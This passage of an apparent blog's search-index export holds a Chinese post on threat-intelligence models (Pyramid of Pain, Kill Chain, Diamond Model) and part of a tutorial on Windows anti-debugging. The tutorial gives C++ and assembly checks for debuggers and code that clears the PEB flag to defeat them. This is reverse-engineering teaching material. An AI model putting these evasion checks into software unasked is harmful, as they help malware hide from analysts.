APT团伙使用升级版数字武器针对周边地区的攻击活动分析 malpedia The World’s First Truly Open Threat Intelligence Community 《蓝宝菇（APT-C-12）：核危机行动揭露》 《APT(高级持续威胁) 概念以及趋势概述 概念以及趋势概述/)》","categories":[{"name":"APT组织","slug":"APT组织","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/"},{"name":"攻击中国","slug":"APT组织/攻击中国","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/%E6%94%BB%E5%87%BB%E4%B8%AD%E5%9B%BD/"}],"tags":[{"name":"APT组织","slug":"APT组织","permalink":"http://wayoka.github.io/tags/APT%E7%BB%84%E7%BB%87/"},{"name":"攻击中国","slug":"攻击中国","permalink":"http://wayoka.github.io/tags/%E6%94%BB%E5%87%BB%E4%B8%AD%E5%9B%BD/"}]},{"title":"攻击模型概述","slug":"攻击模型概述","date":"2020-08-21T03:13:03.000Z","updated":"2021-10-29T09:13:21.333Z","comments":true,"path":"2020/08/21/攻击模型概述/","link":"","permalink":"http://wayoka.github.io/2020/08/21/%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/","excerpt":"0. 威胁情报 0.1 威胁情报的意义 传统的防御机制根据以往的“经验”构建防御策略、部署安全产品，难以应对未知攻击；即使是基于机器学习的检测算法也是在过往“经验”（训练集）的基础寻找最佳的一般表达式，以求覆盖所有可能的情况，实现对未知攻击的检测。 但是过往经验无法完整的表达现在和未来的安全状况，而且攻击手法变化多样，防御技术的发展速度本质上落后与攻击技术的发展速度。 所以需要一种能够根据过去和当前网络安全状况动态调整防御策略的手段，威胁情报应运而生。 通过对威胁情报的收集、处理可以直接将相应的结果分发到安全人员（认读）和安全设备（机读），实现精准的动态防御，达到“未攻先防”的效果。","text":"0. 威胁情报0.1 威胁情报的意义&emsp;传统的防御机制根据以往的“经验”构建防御策略、部署安全产品，难以应对未知攻击；即使是基于机器学习的检测算法也是在过往“经验”（训练集）的基础寻找最佳的一般表达式，以求覆盖所有可能的情况，实现对未知攻击的检测。 &emsp;但是过往经验无法完整的表达现在和未来的安全状况，而且攻击手法变化多样，防御技术的发展速度本质上落后与攻击技术的发展速度。 &emsp;所以需要一种能够根据过去和当前网络安全状况动态调整防御策略的手段，威胁情报应运而生。 &emsp;通过对威胁情报的收集、处理可以直接将相应的结果分发到安全人员（认读）和安全设备（机读），实现精准的动态防御，达到“未攻先防”的效果。 0.2 威胁情报分类(传统分类) 1. 战术级情报： &emsp;战术情报的作用主要是发现威胁事件以及对报警确认或优先级排序。常见的失陷检测情报（CnC 情报，即攻击者控制被害主机所使用的远程命令与控制服务器情报）、IP情报就属于这个范畴，它们都是可机读的情报，可以直接被设备使用，自动化的完成上述的安全工作。 2. 运营级情报： &emsp;运营级情报是给安全分析师或者说安全事件响应人员使用的，目的是对已知的重要安全事件做分析（报警确认、攻击影响范围、攻击链以及攻击目的、技战术方法等）或者利用已知的攻击者技战术手法主动的查找攻击相关线索。 3. 战略级情报： &emsp;战略层面的威胁情报是给组织的安全管理者使用的，比如CSO。它能够帮助决策者把握当前的安全态势，在安全决策上更加有理有据。包括了什么样的组织会进行攻击，攻击可能造成的危害有哪些，攻击者的战术能力和掌控的资源情况等，当然也会包括具体的攻击实例。 0.3 威胁情报用于事件分析&emsp;威胁情报数据并不能帮助甲方来预测攻击，威胁情报在安全运营体系中的定位是——辅助发现潜在的或正在发起的恶意行为或操作，重点在于辅助两个字，威胁情报严格意义上来说只能有限地感知潜在的威胁，换句话说：如果有人现在瞄准的目标全部都是能源类客户，那么威胁情报就可以提醒没有被攻击的客户可能会遭受到该攻击者的攻击，这个叫做有限的感知潜在的威胁。 &emsp;威胁情报既然是个辅助手段，那么肯定有一个主要手段，这个主要的手段其实就是针对事件的分析，两个经常在事件分析中使用的模型——钻石模型和Kill-Chain模型(即 攻击链模型) 将在后续讲到，这两个模型在分析的时候往往需要结合起来使用，尤其是比较大型的针对性的攻击，诸如APT或黑产团伙攻击。 0.4 注意这里要提醒一点，但凡基于威胁情报做分析的时候一定要牢记以下4点： 威胁情报分析出来的结果一般不能作为电子证据确定嫌疑人有计算机犯罪行为 威胁情报分析结果须带有严格的置信度 威胁情报数据由于技术原因限制不可以做到实时性 要在相关机构的监管下进行分析 1. 金字塔模型1.1 金字塔模型起源&emsp;金字塔模型源于David J. Bianco在《The Pyramid of Pain》一文中提出的威胁情报相关指标（单一的信息或数据一般算不上威胁情报，经过分析处理过的有价值的信息才称得上威胁情报）的金字塔模型。 1.2 金字塔模型分级&emsp;金字塔模型分为 6 层，从下到上分别是 HASH值、IP地址、域名、网络或主机特征、TTPs（Tactics、Techniques &amp; Procedures） &emsp;下图左侧是能够利用的情报，右侧是这些情报给攻击者造成的困难程度。一般来说情报中价值最低的是Hash值、IP地址和域名（也就是常说的信誉库），其次是网络/主机特征、攻击工具特征，对攻击者影响最大的是TTPs（战术、技术和行为模式）类型的威胁情报。 这里分别做个简单介绍： HASH值： &emsp;一般指样本、文件的HASH值，比如MD5和SHA系列。由于HASH函数的雪崩效应，文件任何微弱地改变，都会导致产生一个完全不同也不相关的哈希值。这使得在很多情况下，它变得不值得跟踪，所以它带来的防御效果也是最低的。 IP地址： &emsp;常见的指标之一，通过IP的访问控制可以抵御很多常见的攻击，但是又因为IP数量太大，任何攻击者均可以尝试更改IP地址，以绕过访问控制。 域名： &emsp;有些攻击类型或攻击手法也或者出于隐藏的目的，攻击者会通过域名连接外部服务器进行间接通信，由于域名需要购买、注册、与服务器绑定等操作使得它的成本相对IP是比较高的，对域名的把控产生的防御效果也是较好的。但是对于高级APT攻击或大规模的团伙攻击，往往会准备大量备用域名，所以它的限制作用也是有限。 网络或主机特征： &emsp;这里指的特征可以是很多方面，比如攻击者浏览器的User-Agent、登录的用户名、访问的频率等，这些特征就是一种对攻击者的描述，这些情报数据可以很好的将攻击流量从其他的流量中提取出来，就会产生一种较好的防御效果。 攻击工具： &emsp;这里是指获取或检测到了攻击者使用的工具，这种基于工具的情报数据能够使得一批攻击失效，攻击者不得不进行免杀或重写工具，这就达到了增加攻击成本的目的。 TTPs (即 Tactics、Techniques &amp; Procedures 的缩写)： &emsp;这里是指攻击者所使用的攻击策略、手法等，掌握了些信息就能明白攻击者所利用的具体漏洞，就能够针对性的布防，使得攻击者不得不寻找新的漏洞，所以这也是价值最高的情报数据。 2. 针对性攻击事件的分析与防御&emsp;针对性攻击事件的分析主要借助于单个事件分析的Kill-Chain 模型(即 攻击链模型)和钻石模型。 2.1 Kill-Chain 模型(即 攻击链模型)&emsp;攻击链模型从侦察阶段开始，到后渗透阶段共包含7个阶段，主要记录一次完整的攻击行为。 &emsp;Kill-Chain模型分为7个部分，侦查阶段（Reconnaissance）、武器化阶段（Weaponization）、部署阶段（Delivery）、攻击阶段（Exploitation）、后门植入阶段（Installation）、远程控制阶段（C&amp;C）、后渗透阶段（Actives on Objects），也就是下面这个样子： 侦查阶段： 扫描目标IT资产和信息收集。 武器化阶段： 将前一阶段发现和扫描到漏洞的信息整合到一起并制作针对性的武器。 部署阶段： 将这些武器或者是远控RAT部署到对应的Compromised Servers上。 攻击阶段： 使用这些Compromised Servers和之前做好的武器化工具对目标发起攻击。 后门种植阶段： 安装远程控制的服务和进程。 远控阶段： 让目标和C&amp;C通信。 后渗透阶段： 收割、继续横向渗透入侵。 2.2 钻石模型&emsp;钻石模型 主要从4个维度衡量一次攻击事件，是针对单个事件分析的模型。 &emsp;之前说过了一次完整的攻击行为的参考就是上面说到的Kill-Chain，也就是用来描述的攻击者攻击的路线和进行的进度。但是Kill-Chain只能说明攻击的进程和路线，并不能很好地说明其造成的影响和目的，钻石模型就很好的针对性的补充了这点。 &emsp;钻石模型是一个针对单个事件分析的模型，核心就是用来描述攻击者的技战术和目的，具体的钻石模型如下图所示： &emsp;总结一下这幅图就是说明： 攻击者因为什么原因，利用哪些基础设施，并通哪些手段攻击了怎么样的一个目标 具体一点的关于图中信息的解释如下： 社会政治影响： 处于钻石模型上下两个顶点，上顶点表示攻击者，下顶点表示受害者也就是目标。攻击者和受害者之间的某种利益冲突或者是社会地位对立则会产生攻击的意图和发起攻击的原因，纵切面表示的就是社会政治影响。说大白话就是根据这俩人去发现攻击的意图。 技战术组合： 技战术组合位于整个钻石模型的横切面，横切面的两个顶点分别为基础设施和技术能力，这里的基础设施和技术能力其实都是相对于攻击者而言的。 元数据： 这个其实就是左边列出来的，攻击时间、攻击阶段、攻击结果、攻击方向、攻击手段、攻击资源利用 置信度： 也就是以上你分析出结果的可信程度。 2.3 攻击链与钻石模型的组合分析&emsp;复杂的攻击往往都是有一系列的攻击事件组成的，不同的攻击事件指向的目标和达到的目的可以表示出攻击的进程，那么OK，我们如果把事件按照Kill-Chain进行分类同时使用泳道图进行表示，同时把不同的攻击路线分为不同的攻击线程，那么我们就可以得到一个这样的泳道图。 其实这张图描述的是这么一个事件： 攻击者先对目标进行了Google Hacking操作，获得了他们域名解析记录等一些基础的It信息； 攻击者找到了一个目标新注册的域名，然后用搜索引擎搜索他们的网络管理员的电子邮件信息； 攻击者使用鱼叉邮件方式对目标的网络管理员发送一封带有木马的邮件； 目标的网管（我们叫他网管一号）打开了这封邮件的附件然后不幸中枪； 网管一号的主机因为中了病毒，所以攻击者利用网管一号这台主机发送了一个HTTP Post请求到域控节点，然后域控节点返回了一个HTTP Response； 我们通过对鱼叉邮件中附件进行逆向分析发现里面有两个IP地址，第二个IP地址作为备份，防止第一个失效； 通过C&amp;C请求到网管一号的主机，我们的恶意程序打开了一个TCP代理服务； 通过网管一号主机上的代理服务，攻击者继续去Google上搜索其他的目标； 攻击者检查网管一号邮件的通信录列表去寻找是否拥有目标二号的通讯方式，结果发现了目标二号的首席科学家的联系方式； 攻击者使用攻陷的网管一号的邮箱对目标二号的首席科学家的邮箱发起鱼叉邮件攻击，工具使用和之前一样的； 此时又来了一个攻击者，我们称他为攻击者二号，攻击者一号扫描了目标三号的web服务器； 使用同样的漏洞利用工具攻击发现目标三号主机上的相同的漏洞； 被攻陷的目标三号主机返回一个shell会话给攻击者三号； 目标三号的所有数据被攻击者三号窃取 &emsp;这样的话使用Kill-Chain和钻石模型分析可以同时get到攻击者的点和想要攻击的目标，同时还知道了他的攻击路径，也就是说这时候我们对攻击者了如指掌了。 2.4 基于攻击链的安全防护矩阵 3. 总结&emsp;本文来自K0rz3n的博客 威胁情报概念与APT事件分析模型概述，大部分为其所写，这里对文章中的相关知识进行学习，收藏；如有侵权，立即删除。 参考链接：浅析威胁情报使用威胁情报追踪攻击者——Part 1 威胁情报的另类分类使用威胁情报追踪攻击者——Part 2 高级威胁事件分析与防御矩阵使用威胁情报追踪攻击者——Part 3 使用威胁情报调查攻击者浅析威胁情报","categories":[{"name":"威胁情报","slug":"威胁情报","permalink":"http://wayoka.github.io/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"},{"name":"攻击模型","slug":"威胁情报/攻击模型","permalink":"http://wayoka.github.io/categories/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B/"}],"tags":[{"name":"威胁情报","slug":"威胁情报","permalink":"http://wayoka.github.io/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"},{"name":"攻击检测模型","slug":"攻击检测模型","permalink":"http://wayoka.github.io/tags/%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/"}]},{"title":"反调试手段（一）","slug":"反调试之标志位反调试","date":"2020-04-25T07:23:25.000Z","updated":"2021-10-29T09:08:30.717Z","comments":true,"path":"2020/04/25/反调试之标志位反调试/","link":"","permalink":"http://wayoka.github.io/2020/04/25/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B9%8B%E6%A0%87%E5%BF%97%E4%BD%8D%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"1. 静态反调试 静态反调试技术主要使用系统表中的特殊标志位（驻留在进程内存中以及由操作系统设置），其可以用来指示进程正在调试。可以通过使用特定的API函数或检查内存中的系统表来验证这些标志的状态。 这些技术是恶意软件最常用的技术。 本文简单介绍了基于windows API和标志位的10种反调试手段，更详细的Windows反调试知识请到本文最后参考链接的相关文章中查看。 2. IsDebuggerPresent（） 2.1 IsDebuggerPresent() 介绍 函数IsDebuggerPresent()确定当前进程是否正在被调试器调试(例如 OllyDbg或x64dbg)。 此","text":"1. 静态反调试&emsp;静态反调试技术主要使用系统表中的特殊标志位（驻留在进程内存中以及由操作系统设置），其可以用来指示进程正在调试。可以通过使用特定的API函数或检查内存中的系统表来验证这些标志的状态。 &emsp;这些技术是恶意软件最常用的技术。 &emsp;本文简单介绍了基于windows API和标志位的10种反调试手段，更详细的Windows反调试知识请到本文最后参考链接的相关文章中查看。 2. IsDebuggerPresent（）2.1 IsDebuggerPresent() 介绍&emsp;函数IsDebuggerPresent()确定当前进程是否正在被调试器调试(例如 OllyDbg或x64dbg)。 &emsp;此功能允许应用程序确定是否正在调试它，以便它可以修改其行为。例如，如果应用程序正在调试，则可以使用OutputDebugString函数提供其他信息 。 &emsp;要确定是否正在调试远程进程，请使用CheckRemoteDebuggerPresent函数。 &emsp;若要编译使用此功能的应用程序，请将_WIN32_WINNT宏定义为0x0400或更高版本。有关更多信息，请参见 使用Windows标头。 语法： 123456//无参数/*返回值：如果当前进程运行在调试器的上下文，返回值为非零值。 如果当前进程没有运行在调试器的上下文，返回值是零。*/BOOL WINAPI IsDebuggerPresent(void); 函数详细介绍在《IsDebuggerPresent function》 2.2 IsDebuggerPresent() 反调试函数作用机理： &emsp;相对fs段30h偏移的PEB（Process Environment Block）结构（对于x64系统则是相对gs段60h的偏移）。PEB中偏移为2的数据叫做BeingDebugged字段； 关于PEB的说明详见附加说明附加说明章节里的[PEB详解](#1. PEB详解 ) 123450:000&lt; dt _PEBntdll!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar &emsp;IsDebuggerPresent函数会读取BeingDebugged字段的值。如果该进程正在被调试，那么这个值为1，否则为0。 &emsp;也就是说本质是查看BeingDebugged标志位 PEB:::BeingDebugged标志位 x32汇编 123mov eax, fs:[30h]cmp byte ptr [eax+2], 0jne being_debugged x64汇编 123mov rax, gs:[60h]cmp byte ptr [rax+2], 0jne being_debugged wow64:汇编 12mov eax, fs:[30h]cmp byte ptr [eax+1002h], 0 c/c++ 12345678#ifndef _WIN64PPEB pPeb = (PPEB)__readfsdword(0x30);#elsePPEB pPeb = (PPEB)__readgsqword(0x60);#endif // _WIN64 if (pPeb-&gt;BeingDebugged) goto being_debugged; IsDebuggerPresent() 反调试 C++代码实现： 123456789101112#include&lt;windows.h&gt;#include &lt;iostream&gt;int main()&#123; if (IsDebuggerPresent()) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; return 0;&#125; &emsp;所以我们完全可以通过通过直接查看BeingDebugged标志位去判断进程是否被调试。 win32系统下查看调试标志位BeingDebugged汇编如下``： 123450:000&lt; u kernelbase!IsDebuggerPresent L3KERNELBASE!IsDebuggerPresent:751ca8d0 64a130000000 mov eax,dword ptr fs:[00000030h]751ca8d6 0fb64002 movzx eax,byte ptr [eax+2]751ca8da c3 ret 对于x64进程： 123450:000&lt; u kernelbase!IsDebuggerPresent L3KERNELBASE!IsDebuggerPresent:00007ffc`ab6c1aa0 65488b042560000000 mov rax,qword ptr gs:[60h]00007ffc`ab6c1aa9 0fb64002 movzx eax,byte ptr [rax+2]00007ffc`ab6c1aad c3 ret 2.3 IsDebuggerPresent() 反反调试&emsp;为了绕过IsDebuggerPresent检查机制，我们可以在检查代码执行之前，将BeingDebugged设置为0。 &emsp;对于x86进程： 12mov eax, dword ptr fs:[0x30] mov byte ptr ds:[eax+2], 0 &emsp;对于x64进程： 12DWORD64 dwpeb = __readgsqword(0x60);*((PBYTE)(dwpeb + 2)) = 0; 3. CheckRemoteDebuggerPresent()3.1 CheckRemoteDebuggerPresent() 反调试介绍&emsp;CheckRemoteDebuggerPresent()确定是否正在调试指定的进程；与IsDebuggerPresent函数不同，CheckRemoteDebuggerPresent会检查进程是否被另一个并行进程调试。 &emsp;CheckRemoteDebuggerPresent()实际是使用ProcessDebugPort方法的反调试。 &emsp;CheckRemoteDebuggerPresent中的远程并不意味着调试器必须驻留在另一台计算机上。相反，它表示调试器驻留在单独的并行进程中。使用IsDebuggerPresent函数检测调用进程是否在调试器下运行。 &emsp;若要编译使用此功能的应用程序，请将_WIN32_WINNT宏定义为0x0501或更高版本。有关更多信息，请参见使用Windows标头。 &emsp;语法： 1234567//参数1：判断是否被调试的进程句柄//参数2：返回进程是否正在调试，如果正在调试指定的进程，则指向该函数设置为TRUE的变量的指针，否则为FALSE。//返回值：如果成功，返回非0BOOL CheckRemoteDebuggerPresent( HANDLE hProcess, PBOOL pbDebuggerPresent); 3.2 CheckRemoteDebuggerPresent()反调试基于CheckRemoteDebuggerPresent的反调试技术示例代码如下所示： 12345678910111213141516#include&lt;windows.h&gt;#include &lt;iostream&gt;int main(int argc, char *argv[])&#123; BOOL isDebuggerPresent = FALSE; if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebuggerPresent )) &#123; if (isDebuggerPresent ) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; &#125; return 0;&#125; CheckRemoteDebuggerPresent中会调用NtQueryInformationProcess函数： 1234567891011120:000&gt; uf kernelbase!CheckRemotedebuggerPresentKERNELBASE!CheckRemoteDebuggerPresent:...75207a24 6a00 push 075207a26 6a04 push 475207a28 8d45fc lea eax,[ebp-4]75207a2b 50 push eax75207a2c 6a07 push 775207a2e ff7508 push dword ptr [ebp+8]75207a31 ff151c602775 call dword ptr [KERNELBASE!_imp__NtQueryInformationProcess (7527601c)]75207a37 85c0 test eax,eax75207a39 0f88607e0100 js KERNELBASE!CheckRemoteDebuggerPresent+0x2b (7521f89f) &emsp;如果我们查看NtQueryInformationProcess文档，就可知上面汇编代码中，因为ProcessInformationClass参数（第2个参数）值为7，CheckRemoteDebuggerPresent函数会被赋予DebugPort值。具体代码见本文中[2.3.1 ProcessDebugPort章节](#2.3.1 ProcessDebugPort(0x07)) 3.3 CheckRemoteDebuggerPresent()反反调试&emsp;为了绕过CheckRemoteDebuggerPresent以及NTQueryInformationProcess，我们需要替换NtQueryInformationProcess函数的返回值。 绕过CheckRemoteDebuggerPresent()反调试的代码详见本文中[2.3.2 绕过 ProcessDebugPort 反调试章节](#2.3.2 绕过 ProcessDebugPort 反调试) 4. NtQueryInformationProcess()4.1 NtQueryInformationProcess()介绍&emsp;NtQueryInformationProcess()是微软未公开的函数，我们可以控制其第二个参数的传入值，从函数返回值等信息判断进程是否正在被调试。 检查进程是否被调试的第二个参数的参数值一共有 4 个，可以是： 1234ProcessDebugPort 0x07ProcessDebugFlags 0x1FProcessDebugObjectHandle 0x1EProcessBasicInformation 0x00 &emsp;NtQueryInformationProcess()在上面已经做了简单的介绍，基于NtQueryInformationProcess()的反调试技术还有很多，这里再详细介绍一下： &emsp;该函数检索有关指定进程的信息。该NtQueryInformationProcess功能和结构，它的返回信息会根据Windows版本和内部的操作系统而异。为了保持应用程序的兼容性，最好改用ProcessInformationClass参数的描述中提到的公共函数。 如果您确实使用NtQueryInformationProcess，请通过运行时动态链接访问该函数。如果功能已从操作系统更改或删除，这将使您的代码有机会优雅地响应。但是，签名更改可能无法检测到。 此功能没有关联的导入库。您必须使用LoadLibrary和GetProcAddress函数动态链接到Ntdll.dll。 函数语法：详见&emsp;NtQueryInformationProcess() 1234567891011121314/*参数1：要检索其信息的进程的句柄。参数2：要检索的过程信息的类型。该值可以是ProcessBasicInformation(0)、ProcessDebugPort(7)、ProcessWow64Information(26)、ProcessImageFileName(27)、ProcessBreakOnTermination(29)、ProcessSubsystemInformation(75)，该参数代表的具体含义可以到微软关于 NtQueryInformationProcess()函数的介绍网址上查看参数3：指向由调用应用程序提供的缓冲区的指针，函数将请求的信息写入该缓冲区。写入的信息大小取决于ProcessInformationClass参数的数据类型参数4：ProcessInformation参数所指向的缓冲区大小，以字节为单位。参数5：指向变量的指针，函数在该变量中返回所请求信息的大小。如果函数成功，则此值是由ProcessInformation参数指向的写入缓冲区的信息的大小，但是如果缓冲区太小，则这是成功接收信息所需的缓冲区的最小大小。*/__kernel_entry NTSTATUS NtQueryInformationProcess( IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass,//通过此参数传某些参数可以判断是否正在被调试 OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength); 4.2 NtQueryInformationProcess()反调试4.2.1 ProcessDebugPort(0x07)反调试&emsp;ProcessDebugPort是NtQueryInformationProcess()函数的第二个参数的值，表示检索DWORD_PTR值，该值是该进程的调试器的端口号。非零值表示该进程正在Ring 3调试器的控制下运行 如下反调试示例代码就调用了NtQueryInformationProcess： 代码1： 1234567891011121314151617181920212223242526272829303132typedef NTSTATUS (NTAPI *TNtQueryInformationProcess)( IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength );HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);if (hNtdll)&#123; auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot;); if (pfnNtQueryInformationProcess) &#123; DWORD dwProcessDebugPort, dwReturned; NTSTATUS status = pfnNtQueryInformationProcess( GetCurrentProcess(), ProcessDebugPort, &amp;dwProcessDebugPort, sizeof(DWORD), &amp;dwReturned); if (NT_SUCCESS(status) &amp;&amp; (-1 == dwProcessDebugPort)) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; ExitProcess(-1); &#125; &#125;&#125; 代码2： 1234567891011121314151617181920212223242526272829303132333435typedef NTSTATUS(NTAPI *pfnNtQueryInformationProcess)( _In_ HANDLE ProcessHandle, _In_ UINT ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength );const UINT ProcessDebugPort = 7;//这个参数=7表示：检索DWORD_PTR值，该值是该进程的调试器的端口号。非零值表示该进程正在Ring 3调试器的控制下运行。int main(int argc, char *argv[])&#123; pfnNtQueryInformationProcess NtQueryInformationProcess = NULL; NTSTATUS status; DWORD isDebuggerPresent = 0; HMODULE hNtDll = LoadLibrary(TEXT(&quot;ntdll.dll&quot;)); if (NULL != hNtDll) &#123; NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, &quot;NtQueryInformationProcess&quot;); if (NULL != NtQueryInformationProcess) &#123; status = NtQueryInformationProcess( GetCurrentProcess(), ProcessDebugPort, &amp;isDebuggerPresent, sizeof(DWORD), NULL); if (status == 0x00000000 &amp;&amp; isDebuggerPresent != 0) &#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1); &#125; &#125; &#125; return 0;&#125; x86代码： 1234567891011121314 lea eax, [dwReturned] push eax ; ReturnLength push 4 ; ProcessInformationLength lea ecx, [dwProcessDebugPort] push ecx ; ProcessInformation push 7 ; ProcessInformationClass push -1 ; ProcessHandle call NtQueryInformationProcess inc dword ptr [dwProcessDebugPort] jz being_debugged ...being_debugged: push -1 call ExitProcess x64代码： 1234567891011121314lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [dwProcessDebugPort] ; ProcessInformation mov edx, 7 ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], -1 jz being_debugged ...being_debugged: mov ecx, -1 call ExitProcess 4.2.2 ProcessDebugFlags(0x1f)反调试&emsp;该反调试原理为NtQueryInformationProcess会返回EPROCESS内核结构中NoDebugInherit位的取反值。如果NtQueryInformationProcess函数的返回值为0，那么该进程正在被调试。 &emsp;表示过程对象的称为EPROCESS的内核结构包含字段NoDebugInherit。可以使用未记录的类ProcessDebugFlags（0x1f）检索此字段的逆值。因此，如果返回值为0，则存在调试器。 &emsp;c++代码如下： 1234567891011status = NtQueryInformationProcess( GetCurrentProcess(), ProcessDebugFlags, &amp;debugFlags, sizeof(ULONG), NULL);if (0x00000000 == status &amp;&amp; NULL != debugFlags)&#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1);&#125; 代码2： 1234567891011121314151617181920212223242526272829typedef NTSTATUS(NTAPI *TNtQueryInformationProcess)( IN HANDLE ProcessHandle, IN DWORD ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength );HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);if (hNtdll)&#123; auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot;); if (pfnNtQueryInformationProcess) &#123; DWORD dwProcessDebugFlags, dwReturned; const DWORD ProcessDebugFlags = 0x1f; NTSTATUS status = pfnNtQueryInformationProcess( GetCurrentProcess(), ProcessDebugFlags,//注意此参数为0x1f &amp;dwProcessDebugFlags, sizeof(DWORD), &amp;dwReturned); if (NT_SUCCESS(status) &amp;&amp; (0 == dwProcessDebugFlags)) ExitProcess(-1); &#125;&#125; X86汇编： 1234567891011121314 lea eax, [dwReturned] push eax ; ReturnLength push 4 ; ProcessInformationLength lea ecx, [dwProcessDebugPort] push ecx ; ProcessInformation push 1Fh ; ProcessInformationClass //此参数 push -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], 0 jz being_debugged ...being_debugged: push -1 call ExitProcess x64汇编： 1234567891011121314lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [dwProcessDebugPort] ; ProcessInformation mov edx, 1Fh ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], 0 jz being_debugged ...being_debugged: mov ecx, -1 call ExitProcess 4.2.3 ProcessDebugObjectHandle(0x1e)反调试&emsp;调试开始时，将创建一个称为“调试对象”的内核对象。可以通过使用未记录的ProcessDebugObjectHandle（0x1e）类来查询此句柄的值。 c++代码如下： 1234567891011status = NtQueryInformationProcess( GetCurrentProcess(), ProcessDebugObjectHandle,//此值为 0x1e &amp;hProcessDebugObject, sizeof(HANDLE), NULL);if (0x00000000 == status &amp;&amp; NULL != hProcessDebugObject)&#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1);&#125; 代码2： 123456789101112131415161718192021222324252627282930typedef NTSTATUS(NTAPI * TNtQueryInformationProcess)( IN HANDLE ProcessHandle, IN DWORD ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength );HMODULE hNtdll = LoadLibraryA(&quot;ntdll.dll&quot;);if (hNtdll)&#123; auto pfnNtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress( hNtdll, &quot;NtQueryInformationProcess&quot;); if (pfnNtQueryInformationProcess) &#123; DWORD dwReturned; HANDLE hProcessDebugObject = 0; const DWORD ProcessDebugObjectHandle = 0x1e;//注意此参数 NTSTATUS status = pfnNtQueryInformationProcess( GetCurrentProcess(), ProcessDebugObjectHandle, &amp;hProcessDebugObject, sizeof(HANDLE), &amp;dwReturned); if (NT_SUCCESS(status) &amp;&amp; (0 != hProcessDebugObject)) ExitProcess(-1); &#125;&#125; x86汇编： 1234567891011121314lea eax, [dwReturned] push eax ; ReturnLength push 4 ; ProcessInformationLength lea ecx, [hProcessDebugObject] push ecx ; ProcessInformation push 1Eh ; ProcessInformationClass push -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [hProcessDebugObject], 0 jnz being_debugged ...being_debugged: push -1 call ExitProcess x64汇编 1234567891011121314lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [hProcessDebugObject] ; ProcessInformation mov edx, 1Fh ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [hProcessDebugObject], 0 jnz being_debugged ...being_debugged: mov ecx, -1 call ExitProcess 4.2.4 ProcessBasicInformation(0x00)反调试&emsp;当使用ProcessBasicInformation标志来调用NtQueryInformationProcess函数时，就会返回PROCESS_BASIC_INFORMATION结构体： 12345678typedef struct _PROCESS_BASIC_INFORMATION &#123; NTSTATUS ExitStatus; PVOID PebBaseAddress; ULONG_PTR AffinityMask; KPRIORITY BasePriority; HANDLE UniqueProcessId; HANDLE InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION; 这个结构体中最有意思的就是InheritedFromUniqueProcessId字段。这里我们需要获取父进程的名称，然后将其与常用的调试器进行对比。使用这种方法的反调试技术代码如下所示： 123456789101112131415161718192021222324252627282930313233343536373839std::wstring GetProcessNameById(DWORD pid)&#123; HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcessSnap == INVALID_HANDLE_VALUE) &#123; return 0; &#125; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32); std::wstring processName = L&quot;&quot;; if (!Process32First(hProcessSnap, &amp;pe32)) &#123; CloseHandle(hProcessSnap); return processName; &#125; do &#123; if (pe32.th32ProcessID == pid) &#123; processName = pe32.szExeFile; break; &#125; &#125; while (Process32Next(hProcessSnap, &amp;pe32)); 